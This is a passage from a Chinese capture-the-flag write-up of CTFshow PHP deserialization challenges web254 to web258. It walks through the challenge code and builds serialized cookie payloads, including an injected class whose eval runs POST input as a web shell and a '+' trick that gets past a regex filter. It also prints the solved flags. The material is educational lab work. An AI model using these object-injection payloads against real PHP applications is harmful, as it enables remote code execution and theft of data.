class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我让ai分析了一下源码，然后他说让账号密码全是xxxxxx就可以…</p>
<p>确实可以</p>
<p>代码逻辑就是判断账号密码是否符合预期的，如果符合，则返回isVip=true;最终拿到flag</p>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{589d4adb-b0ca-420d-9b64-d73d49a855de}</p>
<h1>web255</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们这里用反序列化，把public $isVip=false;变为public $isVip=true;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>O:11:“ctfShowUser”:1:{s:5:“isVip”;b:1;}</p>
<p>然后通过cookie传进去，由于Cookie 值在 HTTP 协议中有特定的格式要求，并且不能包含某些特殊字符。</p>
<p>所以这里把他们都url全编码一下</p>
<p>%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%31%3a%7b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</p>
<p>ctfshow{c6c55995-2da5-480d-8a4c-7f52bc5b74e2}</p>
<h1>web256</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的源码在第三十二行改变了，有一个强比较!==</p>
<p>这里就是要username和password不一样才可以拿到flag，我们知道在之前我们的username和password都是xxxxxx，那么我们通过反序列化能否把username改成xxxxxx1，password改成xxxxxx2呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>O:11:“ctfShowUser”:3:{s:8:“username”;s:7:“xxxxxx1”;s:8:“password”;s:7:“xxxxxx2”;s:5:“isVip”;b:1;}</p>
<p>老样子改成url编码</p>
<p>%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%33%3a%7b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%37%3a%22%78%78%78%78%78%78%31%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%37%3a%22%78%78%78%78%78%78%32%22%3b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</p>
<p>ctfshow{73fe0959-ad5d-4b35-96ca-2a93b77b9015}</p>
<h1>web257</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__construct()</code> 是 PHP 类的一个<strong>魔术方法</strong>，也叫<strong>构造函数</strong>。<br>
它会在<strong>类被实例化时</strong>自动调用，通常用于初始化对象的属性或执行一些必要的操作。</p>
<p>例如private $username=‘xxxxxx’;</p>
<p><code>__destruct()</code> 方法是 PHP 中的<strong>析构函数</strong>，它在<strong>对象生命周期结束</strong>时自动调用。</p>
<p>例如脚本执行完之后，private $username=‘xxxxxx’;被销毁，触发__destruct()</p>
<p>分析：</p>
<p>我们需要backDoor里面的eval函数</p>
<p>那么我们可以把$code改为$code=$_POST[a]</p>
<p>先分析主函数，里面有login函数</p>
<p>里面还有一个info函数，对我们没有什么用，可以删除。把__construct()当中的$this-&gt;class=new info();改为$this-&gt;class=new backDoor();</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[zmr]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser)));</span><br></pre></td></tr></table></figure>
<p>cookie：user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A18%3A%22eval%28%24_POST%5Bzmr%5D%29%3B%22%3B%7D%7D</p>
<p>post</p>
<p>zmr=system(‘tac flag.php’);</p>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{16016ad4-f316-4462-979f-30112ed0f119}</p>
<h1>web258</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反</p>
<p>了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code><br>
这种情况是用<code>+(加号)</code>绕过的，如：<code>o:+</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$b</span>=<span 